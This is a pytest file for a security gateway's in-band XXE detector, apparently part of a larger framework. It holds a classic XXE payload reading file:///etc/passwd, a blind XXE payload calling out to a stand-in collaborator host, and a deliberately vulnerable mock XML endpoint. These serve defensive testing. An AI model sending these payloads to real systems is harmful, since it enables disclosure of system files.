"""
AEGIS Gateway — IN-BAND file-disclosure XXE response-side block-path.

An external-entity DTD that leaks a file's contents INTO the app's own response is provable from a
single request/response exchange, so the gateway forwards, holds the response, runs the response-side
side-effect oracle over it, and withholds it only on a CONFIRMED verdict:

  * in-band XXE is BLOCKED only when (1) the request body DECLARED an external (SYSTEM/PUBLIC) entity
    (the same `_XXE_RE` LEAD signal), AND (2) a strict `/etc/passwd` root-line signature surfaced in
    the response, AND (3) the declaring body is NOT reflected verbatim (the docs-page FP twin guard).
    ``side_effect_oracle`` confirms the exact leaked line reached the response — near-zero FP.
  * BLIND / OOB XXE (an external entity declared but NO file content inline) stays a LEAD — a single
    inline response cannot prove it; its sound block-path is the OOB callback oracle.
  * every block carries a certificate that re-runs offline (``CertRef.reverify``).

The `_XxeUpstream` below is a deliberately vulnerable stand-in for the operator's own XML endpoint so
the end-to-end proxy-and-confirm path is exercised over real sockets.
"""

from __future__ import annotations

import http.server
import socketserver
import threading
import urllib.error
import urllib.request
from collections.abc import Iterator

import pytest

from framework.v2.aegis.gateway import serve_gateway
from framework.v2.aegis.inspect import inspect_response
from framework.v2.aegis.models import AegisConfig, Verdict

# A canonical leaked /etc/passwd body (root at uid/gid 0 — the strict anchor the oracle keys on).
_PASSWD = ("root:x:0:0:root:/root:/bin/bash\n"
           "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
           "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n")

_XML = [("Content-Type", "application/xml")]

# An external-entity DTD that reads a local file (the classic in-band XXE payload).
_XXE_FILE = ('<?xml version="1.0"?>'
             '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
             '<foo>&xxe;</foo>')
# An external-entity DTD that points OUT-OF-BAND (blind XXE) — no file content is reflected inline.
_XXE_BLIND = ('<?xml version="1.0"?>'
              '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab.example/x.dtd"> ]>'
              '<foo>&xxe;</foo>')
# An ordinary XML API request (no external entity at all).
_XML_ORDINARY = '<note><to>bob</to><help>see the /etc/passwd docs page</help></note>'


class _XxeUpstream(http.server.BaseHTTPRequestHandler):
    """Deliberately vulnerable XML endpoint. A request body that declares an external SYSTEM entity
    toward a local FILE is 'resolved' and the file content is leaked into the response ON ITS OWN LINE
    (in-band XXE). An external entity toward an OUT-OF-BAND URL is 'fetched' with no inline reflection
    (blind XXE). Anything else is an ordinary, benign ack."""

    def log_message(self, *_a):
        return

    def _read(self) -> str:
        n = int(self.headers.get("Content-Length", "0") or "0")
        return self.rfile.read(n).decode("utf-8", "replace") if n > 0 else ""

    def _send(self, out: bytes) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(out)

    def do_POST(self):
        low = self._read().lower()
        declares_ext = "<!entity" in low and "system" in low
        reads_file = declares_ext and "file:" in low
        if reads_file:
            # VULNERABLE: the parser resolved the external file entity — content leaks on its own line.
            self._send(("<result>\n" + _PASSWD + "</result>").encode())
        elif declares_ext:
            # blind/OOB XXE: the parser fetched the entity out of band; response carries no file bytes.
            self._send(b"<result>accepted for processing</result>")
        else:
            self._send(b"<result>ok</result>")   # ordinary XML API


@pytest.fixture()
def xxe_upstream() -> Iterator[int]:
    srv = socketserver.TCPServer(("127.0.0.1", 0), _XxeUpstream)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield srv.server_address[1]
    finally:
        srv.shutdown()
        srv.server_close()


def _gateway(upstream_port: int, *, mode: str, sink: list | None = None):
    gw = serve_gateway(f"http://127.0.0.1:{upstream_port}",
                       config=AegisConfig(deployment_secret="k", mode=mode),
                       host="127.0.0.1", port=0,
                       on_verdict=(sink.append if sink is not None else None))
    threading.Thread(target=gw.serve_forever, daemon=True).start()
    return gw, gw.server_address[1]


def _post(port: int, body: str):
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/upload", data=body.encode(),
        headers={"Content-Type": "application/xml"}, method="POST")
    return urllib.request.urlopen(req, timeout=5)


# --------------------------------------------------------------------------- end-to-end (enforce)

def test_inband_xxe_file_disclosure_is_blocked_with_certificate(xxe_upstream):
    """POSITIVE: an external-entity DTD reads /etc/passwd, the file content surfaces in the response,
    and the payload is NOT echoed — the side-effect oracle confirms and the gateway returns 403 with a
    certificate that re-verifies offline."""
    sink: list[Verdict] = []
    gw, port = _gateway(xxe_upstream, mode="enforce", sink=sink)
    try:
        with pytest.raises(urllib.error.HTTPError) as ei:
            _post(port, _XXE_FILE)
        assert ei.value.code == 403 and ei.value.headers.get("X-Aegis-Block") == "xxe"
        assert ei.value.headers.get("X-Aegis-Certificate")   # the block carries the cert id
        v = next(v for v in sink if v.decision == "confirmed" and v.attack_class == "xxe")
        assert v.action == "block"
        assert v.certificate is not None and v.certificate.reverify() is True
    finally:
        gw.shutdown()


def test_blind_xxe_is_not_blocked_relayed_as_a_lead(xxe_upstream):
    """FP TWIN 2 (end-to-end): a blind/OOB external-entity DTD whose response carries NO file content
    cannot be proven inline — it stays a LEAD and the response is relayed untouched."""
    gw, port = _gateway(xxe_upstream, mode="enforce")
    try:
        body = _post(port, _XXE_BLIND).read().decode()
        assert "accepted for processing" in body   # relayed, never blocked
    finally:
        gw.shutdown()


def test_ordinary_xml_request_is_not_blocked(xxe_upstream):
    """FP TWIN 3 (end-to-end): an ordinary XML API request with no external entity is relayed even
    though it mentions /etc/passwd in a help field (no external-entity vector => never a candidate)."""
    gw, port = _gateway(xxe_upstream, mode="enforce")
    try:
        assert "ok" in _post(port, _XML_ORDINARY).read().decode()
    finally:
        gw.shutdown()


def test_observe_mode_forwards_but_emits_the_xxe_verdict(xxe_upstream):
    """observe mode NEVER blocks — the leaked response is forwarded as-is — but the confirmed xxe
    verdict is still emitted for the operator's telemetry sink."""
    sink: list[Verdict] = []
    gw, port = _gateway(xxe_upstream, mode="observe", sink=sink)
    try:
        body = _post(port, _XXE_FILE).read().decode()
        assert "root:x:0:0:" in body   # forwarded untouched (observe is read-only)
        v = next(v for v in sink if v.decision == "confirmed" and v.attack_class == "xxe")
        assert v.action == "observe"   # confirmed, but never enforced in observe mode
    finally:
        gw.shutdown()


# --------------------------------------------------------------------------- unit FP corpus

def test_inband_xxe_unit_fires_on_file_disclosure_only():
    # external-entity DTD in the request + a strict passwd root line on its own line + not reflected.
    resp = "<result>\n" + _PASSWD + "</result>"
    v = inspect_response("/upload", _XML, _XXE_FILE, resp, enforce=True)
    assert v is not None and v.attack_class == "xxe" and v.action == "block"
    assert v.certificate is not None and v.certificate.reverify()


def test_inband_xxe_unit_zero_fp_corpus():
    """Each of these MUST NOT fire (near-zero FP)."""
    cases = [
        # FP TWIN 1 — a docs/help page that SHIPS the DTD example verbatim AND shows a passwd line: the
        # request payload is reflected verbatim, so the not-reflected guard neutralises it.
        (_XXE_FILE, "example XXE payload: " + _XXE_FILE + "\n" + _PASSWD),
        # FP TWIN 2 — blind XXE: an external entity is declared but the response has NO file content.
        (_XXE_BLIND, "<result>accepted for processing</result>"),
        # FP TWIN 2b — blind XXE whose response merely NAMES the file, no uid/gid-0 root line.
        (_XXE_BLIND, "<result>could not read /etc/passwd</result>"),
        # FP TWIN 3 — ordinary XML (NO external entity) even though the response carries a passwd line.
        (_XML_ORDINARY, "dump:\n" + _PASSWD),
        # a benign non-XML body that happens to carry a passwd line in the response (no DTD vector).
        ("q=how+to+read+etc+passwd", "help:\n" + _PASSWD),
        # external-entity DTD + a colon-line that is NOT a uid/gid-0 root passwd line.
        (_XXE_FILE, "<result>\nname:role:0:reader:active\n</result>"),
        # external-entity DTD, response NAMES passwd but carries no root:x:0:0 line.
        (_XXE_FILE, "<result>Contents of /etc/passwd are access-protected</result>"),
    ]
    for body, resp in cases:
        assert inspect_response("/upload", _XML, body, resp, enforce=True) is None, (body, resp)


def test_inband_xxe_unit_reflected_verbatim_is_not_blocked():
    """FP TWIN 1 isolated: even WITH a real passwd root line present, a response that echoes the
    request body verbatim is treated as a reflecting docs/paste page, not a file the app read."""
    # the whole request body appears verbatim in the response (reflected) alongside a passwd line.
    resp = _PASSWD + "\nyou submitted: " + _XXE_FILE
    assert inspect_response("/upload", _XML, _XXE_FILE, resp, enforce=True) is None


def test_no_request_body_never_blocks():
    """A response carrying a passwd line but NO request body (so no external-entity vector) never
    blocks — attribution to an XXE payload is impossible."""
    assert inspect_response("/upload", _XML, None, "<result>\n" + _PASSWD + "</result>",
                            enforce=True) is None
